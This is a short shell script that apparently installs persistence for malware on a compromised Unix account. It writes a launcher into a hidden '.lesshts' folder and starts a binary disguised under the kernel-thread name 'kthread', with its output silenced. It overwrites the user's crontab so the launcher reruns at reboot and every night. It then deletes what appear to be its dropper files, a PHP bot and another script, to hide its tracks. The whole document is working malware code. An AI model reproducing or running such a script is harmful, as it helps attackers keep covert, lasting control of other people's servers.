#!/bin/sh
echo "#!/bin/sh" > `pwd`/.lesshts/run.sh
echo "#kthread daemon" >> `pwd`/.lesshts/run.sh
echo "killall -9 kthread" >> `pwd`/.lesshts/run.sh
echo "sleep 5" >> `pwd`/.lesshts/run.sh
echo "cd `pwd`/.lesshts" >> `pwd`/.lesshts/run.sh
echo "`pwd`/.lesshts/kthread > /dev/null 2>&1" >> `pwd`/.lesshts/run.sh
chmod 700 `pwd`/.lesshts/run.sh
chmod 700 `pwd`/.lesshts/kthread
`pwd`/.lesshts/run.sh &
echo "@reboot `pwd`/.lesshts/run.sh > /dev/null 2>&1" > `pwd`/.lesshts/.cron
echo "59 23 * * * `pwd`/.lesshts/run.sh > /dev/null 2>&1" >> `pwd`/.lesshts/.cron
crontab `pwd`/.lesshts/.cron
crontab .lesshts/.cron
rm -rf joss.phpbot.php
rm -rf shit.sh
